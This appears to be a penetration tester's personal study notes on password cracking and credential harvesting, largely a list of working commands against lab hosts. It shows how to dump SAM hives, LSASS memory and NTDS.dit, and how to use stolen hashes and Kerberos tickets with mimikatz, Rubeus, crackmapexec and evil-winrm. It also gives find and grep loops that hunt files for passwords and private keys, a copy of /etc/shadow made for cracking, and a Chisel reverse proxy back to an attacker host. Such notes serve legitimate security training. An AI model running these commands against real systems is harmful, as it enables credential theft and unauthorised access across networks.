# 🔐 Password Cracking & Credential Harvesting

**Tags:** `#passwordcracking` `#passwords` `#auth` `#authentication`

---

## 🧰 Tools

- [[john the ripper]]
- [[crackmapexec]]
- [[Evil WinRM]]
- [[Hydra]]
- [[metasploit]]
- [[05 - Personal/Jonathan/Tools/Auth/hashcat]]
- [[Username Anarchy]]
- [[CeWL]]
- [[SMBserver]]
- [[secretsdump]]

---

## 🧠 Core Concepts

- Common passwords are often simple and reused—even after breaches.
- Pure brute force is inefficient; smart wordlists and rulesets are key.
- Password cracking is part science, part art—especially when crafting rules.

---

## 🛠️ Attack Workflow

### 1. Acquire Username & Password Lists

- Scrape names/keywords from websites using tools like **CeWL**.
- Look up default credentials:
    - DefaultCreds Cheat Sheet
    - Router Default Passwords

### 2. Define Rulesets

- Match known password patterns or organizational naming conventions.

### 3. Use the Right Tool

- Choose based on protocol (e.g., RDP, SSH, SMB) or interface (CLI, GUI).

### 4. Crack with Hashcat

```bash
hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
```

- `custom.rule` defines how to mutate passwords (e.g., capitalization, appending numbers).

### 5. Username Mangling

```bash
./username-anarchy -i /path/to/listoffirstandlastnames.txt
```

---

## 🔡 Common Password Patterns

|**Description**|**Example**|
|---|---|
|First letter uppercase|`Password`|
|Add numbers|`Password123`|
|Add year|`Password2022`|
|Add month|`Password02`|
|End with exclamation mark|`Password2022!`|
|Add special characters|`P@ssw0rd2022!`|

---

## 🪟 Dumping Windows Registry SAM Hashes

### 🧬 Save Registry Hives

```cmd
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save
```

|**Hive**|**Purpose**|
|---|---|
|`hklm\sam`|Contains local account password hashes.|
|`hklm\system`|Contains the bootkey used to encrypt the SAM database.|
|`hklm\security`|May contain cached domain credentials (useful on domain-joined machines).|

### 📤 Transfer to Cracking Machine

```bash
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/
```

### 🔓 Dump Hashes

- Use **secretsdump** to extract hashes from the saved hives.

---

## 🧠 Dumping LSASS Memory

### 🖥️ GUI Method

- Open Task Manager → Find `lsass.exe` → Right-click → **Create Dump File**

### 🖥️ CLI Method

```cmd
tasklist /svc
Get-Process lsass
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```

### 🔍 Extract with Pypykatz

```bash
pip3 install pypykatz
pypykatz lsa minidump /home/peter/Documents/lsass.dmp
```

- **MSV**: NT/SHA1 hashes (crack with Hashcat)
- **WDIGEST**: Cleartext passwords (legacy)
- **Kerberos**: Ticket-based authentication

```bash
sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```

---

## 🏢 Active Directory Attacks

- SAM is used for local accounts; AD accounts use **NTDS.dit**.
- Dictionary attacks are noisy and can cause account lockouts.

### 🧾 Username Generation

- Use OSINT or tools like **Username Anarchy**.

|**Convention**|**Example (Jane Jill Doe)**|
|---|---|
|`firstinitiallastname`|`jdoe`|
|`firstinitialmiddleinitiallastname`|`jjdoe`|
|`firstnamelastname`|`janedoe`|
|`firstname.lastname`|`jane.doe`|
|`lastname.firstname`|`doe.jane`|
|`nickname`|`doedoehacksstuff`|

### 🧬 Dumping NTDS.dit

```cmd
vssadmin CREATE SHADOW /For=C:
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```

- Requires **local admin** on the domain controller.
- Can be automated with **crackmapexec**.

### 🔑 Pass-the-Hash

```bash
evil-winrm -i 10.129.201.57 -u Administrator -H "64f12cddaa88057e06a81b54e73b949b"
```

---

## 🔍 Windows Credential Hunting

- Use search tools to find stored credentials.

```cmd
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```

- Tools: `#Lazagne`, `findstr`, `PowerShell`, etc.

### 🗂️ Common Locations

- Group Policy (SYSVOL)
- Scripts on IT/dev shares
- `unattend.xml`
- AD user/computer description fields
- KeePass databases
- Files like `pass.txt`, `passwords.docx`, `passwords.xlsx`
- SharePoint and user shares

---

## 🐧 Linux Credential Harvesting

|**Files**|**History**|**Memory**|**Keyrings**|
|---|---|---|---|
|Configs|Command-line history|In-memory processing|Browser-stored credentials|
|Databases|Logs|||
|Notes||||
|Scripts||||
|Source code||||
|Cronjobs||||
|SSH Keys||||

---


- Config files typically are `.config`, `.conf`, `.cnf`
- Look for config files `for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done`
- Look for `user`, `password`, `pass` in `.cnf` files `for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done`
- Look for `.db` or `.sql` files `for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done`
- Look for `.txt` files `find /home/* -type f -name "*.txt" -o ! -name "*.*"`
- Look for various scripting files `for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done`
- Look at cronjobs `cat /etc/crontab`, `ls -la /etc/cron.*/`
- Look for private keys `grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"`
- Look for public keys `grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"`
- Look at bash history `tail -n5 /home/*/.bash*`
- Look at log files `for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done`
- Look at memory files with #mimpenguin`sudo python3 mimipenguin.py` , `sudo bash mimipenguin.sh` 
- Use #Lazagne to look for creds in memory `sudo python2.7 laZagne.py all` , `python3 laZagne.py browsers`
- Check firefox files `ls -l .mozilla/firefox/ | grep default` , `cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .`
	- Decrypt files with #FirefoxDecrypt `python3.9 firefox_decrypt.py`

| **Log File**          | **Description**                                    |
| --------------------- | -------------------------------------------------- |
| `/var/log/messages`   | Generic system activity logs.                      |
| `/var/log/syslog`     | Generic system activity logs.                      |
| `/var/log/auth.log`   | (Debian) All authentication related logs.          |
| `/var/log/secure`     | (RedHat/CentOS) All authentication related logs.   |
| `/var/log/boot.log`   | Booting information.                               |
| `/var/log/dmesg`      | Hardware and drivers related information and logs. |
| `/var/log/kern.log`   | Kernel related warnings, errors and logs.          |
| `/var/log/faillog`    | Failed login attempts.                             |
| `/var/log/cron`       | Information related to cron jobs.                  |
| `/var/log/mail.log`   | All mail server related logs.                      |
| `/var/log/httpd`      | All Apache related logs.                           |
| `/var/log/mysqld.log` | All MySQL server related logs.                     |

Linux Auth
* [The Linux-PAM System Administrators' Guide (archive.org)](https://web.archive.org/web/20220622215926/http://www.linux-pam.org/Linux-PAM-html/Linux-PAM_SAG.html)
	* /usr/lib/x86_x64-linux-gnu/security/
	* `pam_unix.so` and `pam_unix2.so`
	* `/etc/passwd` and `/etc/shadow`
	* if `/etc/passwd` is writable the password field can be deleted, thus deleting the password
	* if `/etc/shadow` is readable the hashes can be grabbed
		* `$<type>$<salt>$<hashed>`
	* password field containing `!` or `*` cannot be logged into with a UNIX session
	* old passwords can be stored in `/etc/security/opasswd`

| `cry0l1t3` | `:` | `x`           | `:` | `1000` | `:` | `1000` | `:` | `cry0l1t3,,,`      | `:` | `/home/cry0l1t3` | `:` | `/bin/bash` |
| ---------- | --- | ------------- | --- | ------ | --- | ------ | --- | ------------------ | --- | ---------------- | --- | ----------- |
| Login name |     | Password info |     | UID    |     | GUID   |     | Full name/comments |     | Home directory   |     | Shell       |

|`cry0l1t3`|`:`|`$6$wBRzy$...SNIP...x9cDWUxW1`|`:`|`18937`|`:`|`0`|`:`|`99999`|`:`|`7`|`:`|`:`|`:`|
|---|---|---|---|---|---|---|---|---|---|---|---|---|---|
|Username||Encrypted password||Last PW change||Min. PW age||Max. PW age||Warning period|Inactivity period|Expiration date|Unused|

- `$1$` – MD5
- `$2a$` – Blowfish
- `$2y$` – Eksblowfish
- `$5$` – SHA-256
- `$6$` – SHA-512

- Cracking credentials
	- `sudo cp /etc/passwd /tmp/passwd.bak`
	- `sudo cp /etc/shadow /tmp/shadow.bak`
	- `unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes`
	- `hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked` adjust hash method as needed

Pass the hash - Windows
- [Use Alternate Authentication Material: Pass the Hash, Sub-technique T1550.002 - Enterprise | MITRE ATT&CK®](https://attack.mitre.org/techniques/T1550/002/)
- Dumping the local SAM database from a compromised host.
- Extracting hashes from the NTDS database (ntds.dit) on a Domain Controller.
- Pulling the hashes from memory (lsass.exe).
- Use [[mimikatz]] to pass a captured hash to auth
- Use [[Invoke-TheHash]] to pass the hash within powershell
- Use [mlgualtieri/NTLMRawUnHide](https://github.com/mlgualtieri/NTLMRawUnHide) to grab a hash from wireshark capture

Pass the hash - Linux
- [[impacket-psexec]] 
	- `impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453`
- [[crackmapexec]]
	- `crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453`
	- `crackmapexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami`
- RDP
	- Target windows needs registry added
		- `reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f`
	- `xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\ Policies\System\LocalAccountTokenFilterPolicy` set to 1 to allow admin functions remotely per UAC

##### Pass The Ticket - Windows (Kerberos attacks)
- To use Kerberos tickets for movement in AD such as #kerberoasting
- The `TGT - Ticket Granting Ticket` is the first ticket obtained on a Kerberos system. The TGT permits the client to obtain additional Kerberos tickets or `TGS`.
	- Password hash encrypts timestamp sent to ADDC
- The `TGS - Ticket Granting Service` is requested by users who want to use a service. These tickets allow services to verify the user's identity.
	- TGS per service
- Stored/processed in LSASS
	- Non-admin only current authenticated user
	- Admin all user tickets
- [[mimikatz]]
	- `sekurlsa::tickets /export`
		- will export tickets to a .kirbi file
	- Tickets end with`$` are computer accounts
	- Tickets end with `@` are service names
- [[Rubeus]]
	- `Rubeus.exe dump /nowrap` dumps all tickets if ran as admin, prints in b64 
- Pass the key or OverPass the hash
	- The `Pass the Key` or `OverPass the Hash` approach converts a hash/key (rc4_hmac, aes256_cts_hmac_sha1, etc.) for a domain-joined user into a full `Ticket-Granting-Ticket (TGT)`
	- [[mimikatz]]
		- `sekurlsa::ekeys` dump encryption keys
		- `privilege::debug`
		- `sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f` open a CMD in the user 'plaintext' context based on the ntlm encryptiong key 
	- [[Rubeus]]
		- `Rubeus.exe  asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap` take encryption key (found with mimi) to open a CMD in context of 'plaintext' user 






- Pass the Ticket
	- [[Rubeus]]
		- `Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt` use TGT in session
		- `Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi` use kirbi file from mimi
		- `[Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))` convert kirbi file to b64
		- `Rubeus.exe ptt /ticket:{B64}` use the b64 version of the ticket, either from rubeus dump or a converted kirbi file
	- [[mimikatz]]
		- `kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"` use kirbi file to pass the ticket
	- [[Powershell]] Remoting - once a session is made use powershell remoting to gain access to other systems
		- `Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show` open a CMD session as user
			- `Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt` pass the ticket for a new user
			- Open powershell in new user context
				- `Enter-PSSession -ComputerName {target}`
		- [[mimikatz]]
			- once a session is created with user open powershell
				- `Enter-PSSession -ComputerName {target}`
Pass the Ticket Linux
- Linux systems connected to Active Directory
- Uses kerberos for auth, same workflow as windows but different storage
- Usually stored as **ccache** files in /tmp, must be root to access all files
- Location of stored ccache files can also be found in the env variable **KRB5CCNAME**
	- `env | grep -i krb5` - quick print of location
- **Keytab** contains kerberos principal and encrypted key pairs.  These allow automatic authentication
	- `find / -name *keytab* -ls 2>/dev/null` find keytab files 
	- Look for cronjobs `crontab -l` that might have them or use `kinit`
	- Default `/etc/krb5.keytab`
	- `klist` list keytab information of current user
	- `klist -k -t` read a keytab file
	- `kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab` import carlos' Kerberos ticket to our session (update user and keytab location as needed)
		- **to save the profile of the current user before running kinit, copy the ccache file first**
	- `python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab` use the tool [KeyTabExtrac](https://github.com/sosdave/KeyTabExtract) to extract hashes from the keytab, then use normal cracking methods
		- `./keytabextract.py [file.keytab]`
	- **Root** can impersonate anyone by copying the keytab file and exporting its location to the env variable **KRB5CCNAME**
		- `cp /tmp/krb5cc_647401106_I8I133 .`
		- `KRB5CCNAME=/root/krb5cc_647401106_I8I133`
- `realm` tool used to manage domain joined system
	- `realm list` check domain join status 
- Alternate method is to look for other processes used with AD
	- `ps -ef | grep -i "winbind\|sssd"`
- Before using other tools to attack active directory make sure to have the proper **keytab** file in **KRB5CCNAME** of the victim's user
- In some instances the victim doesn't have direct connection to the domain controller, but can access a target that does.  In this case we need to setup a proxy
	- [[Proxychains]] with [[Chisel]]
	- Attacker
		- `sudo ./chisel server --reverse`
	- Victim
		- `c:\tools\chisel.exe client 10.10.14.33:8080 R:socks`
		- Xfer the ccache 

Protected File Attacks
- Attack files that have passwords or encryption
- `for ext in $(echo ".xls .xls* .xltx .csv .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done`  Look for files that might be encrypted and have sensitive data
- [Encoded File Formats (fileinfo.com)](https://fileinfo.com/filetypes/encoded) or [Compressed File Formats (fileinfo.com)](https://fileinfo.com/filetypes/compressed)might help identify file types
- `grep -rnw "PRIVATE KEY" /* 2>/dev/null | grep ":1"` look for key files that could be used for encryption
- [[john the ripper]] use {file type}tojohn scripts to convert them to a john file
- [[05 - Personal/Jonathan/Tools/Auth/hashcat]] have to identify the mode first
- `file GZIP.gzip` file may be used to see if the file is something else that might have encryption (in this example **openssl** can encrypt **gzip** files)
	- `GZIP.gzip: openssl enc'd data with salted password`
- `for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null| tar xz;done` attempt to crack **openssl** with the rockyou password list, if successful it will output the contents of this gzip file
- `bitlocker2john -i Backup.vhd > backup.hashes` convert **bitlocker** encrypted virtual HD to hash file
	- `grep "bitlocker\$0" backup.hashes > backup.hash` extract a hash
	- `hashcat -m 22100 backup.hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt -o backup.cracked` use **hashcat** to crack **bitlocker**